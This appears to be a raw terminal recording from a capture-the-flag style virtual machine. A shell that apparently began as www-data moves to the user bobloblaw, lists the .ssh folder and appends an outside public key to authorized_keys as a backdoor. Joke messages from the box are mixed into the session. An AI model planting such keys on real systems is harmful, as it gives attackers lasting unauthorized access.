+drwxr-xr-x  3 bobloblaw bobloblaw  4096 Jul 30  2020 Documents
+drwxr-xr-x  2 bobloblaw bobloblaw  4096 Jul 24  2020 Downloads
+-rw-r--r--  1 bobloblaw bobloblaw  8980 Jul 24  2020 examples.desktop
+-rw-------  1 bobloblaw bobloblaw 16456 Aug  6  2020 .ICEauthority
+drwxrwxr-x  3 bobloblaw bobloblaw  4096 Jul 24  2020 .local
+drwx------  5 bobloblaw bobloblaw  4096 Jul 26  2020 .mozilla
+drwxr-xr-x  2 bobloblaw bobloblaw  4096 Jul 24  2020 Music
+drwxr-xr-x  2 bobloblaw bobloblaw  4096 Jul 24  2020 Pictures
+-rw-r--r--  1 bobloblaw bobloblaw   675 Jul 24  2020 .profile
+drwxr-xr-x  2 bobloblaw bobloblaw  4096 Jul 24  2020 Public
+drwx------  2 bobloblaw bobloblaw  4096 Jul 28  2020 .ssh
+-rw-r--r--  1 bobloblaw bobloblaw     0 Jul 24  2020 .sudo_as_admin_successful
+drwxr-xr-x  2 bobloblaw bobloblaw  4096 Jul 24  2020 Templates
+drwxr-xr-x  2 bobloblaw bobloblaw  4096 Jul 24  2020 Videos
+-rw-------  1 bobloblaw bobloblaw    65 Aug  6  2020 .Xauthority
+-rw-------  1 bobloblaw bobloblaw  3225 Aug  6  2020 .xsession-errors
+-rw-------  1 bobloblaw bobloblaw  3225 Aug  6  2020 .xsession-errors.old
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ cd .ssh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd .ssh
+[Kcd .ssh[Kcd .ssh[Kcd .ssh
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+authorized_keys  id_rsa  id_rsa.pub
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ You haven't rooted me yet? Jeez[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ You haven't rooted me yet? Jeez[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ You haven't rooted me yet? Jeez
+[K[K[?2004h[?2004l[?2004h
+[K
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ echo "[7mssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBH512Cnv[27m[7mU[27m[7mLKODSkZGV1uCn9x0TG62MTQnA8s7XWS5qI h471x@winux[27m[A[C[C[C[C[C[C[C[C[C[C[C[Cssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBH512CnvULKODSkZGV1uCn9x0TG62MTQnA8s7XWS5qI h471x@winux" >> authorized_keys[A[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hecho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBH512CnvULKODSkZGV1uCn9x0TG62MTQnA8s7XWS5qI h471x@winux" >> authorized_keys
+[K<0TG62MTQnA8s7XWS5qI h471x@winux" >> authorized_keys 
+[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ cat authorized_je[K[Kkeys[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat authorized_keys
+[Kcat authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCmwTQuZn28XiLk9+lFbXV8+KbO7a/nNHJwlCIjddwanvFmcKbD6iaLGbsJMzaB28WMSIxxLhGDW8MS8etL1hupmn7SYxMU4KSPx4U8dw63mZLfwJtCghVZEBUn+8bwB0eDhMey6yXCGTGROjEHUidGVgvtmBsAL7eFMQ7O8a0Ka1LkUDJ4tUs+3DREZJvD8KoUGSPr3tiNvbJTXOrIT/kYWZZBls79wIQkG2nPX4j1VUxXbOvlRXDkJ5Z2ecud/T7JYCLZ/VmFzvAO3TgUH4LnkOn8hjiECGmVRMMC0JK5v1MwsxH9x2NFUouKu4UfdIhrXJmIyuZ2RhcjpvxQ5JdBkvQb2USEmwGbT8D2UKDynIPlN5YdgA7GprZewYe08K4NMkXl8HPLaQNoJ0xzfj5WahC0fGZI5PuoARtkxPCpNmHKnR9I/tJSXRW6s5pU8zYM2rnxolgJjDgkTQyUw1n3axbVO4PDUBvEAtR87qH8z+GssxY6+iMmogZoP1luPaZmBY8up1W7CwkfbLkZf63rziP2GiOzrimQ0uEQBnDtjG2rwsEJXkSoaPJFbuzFv5Rc0l4YJPvZQAuJoJ20XST/ldK3EtoFf/n1otnZI3CuW1B/yx83QrlIPDaJiTE+hfEaitjQM6cGmppPFX+XDmYSo5jNpcQC5pVx2wLVPtLCyQ== bobloblaw@bobloblaw-VirtualBox
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBH512CnvULKODSkZGV1uCn9x0TG62MTQnA8s7XWS5qI h471x@winux
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ You haven't rooted me yet? Jeez[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ You haven't rooted me yet? Jeez[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ You haven't rooted me yet? Jeez
+[K[K[?2004h[?2004l[?2004h
+[K
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[KNow that, I can get behind!
+[Kwww-data@bobloblaw-VirtualBox:/usr/bin$ [Kwww-data@bobloblaw-VirtualBox:/usr/bin$ [K[?2004hwww-data@bobloblaw-VirtualBox:/usr/bin$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[?2004l
+Script done on 2025-02-14 23:08:49+03:00 [COMMAND_EXIT_CODE="0"]
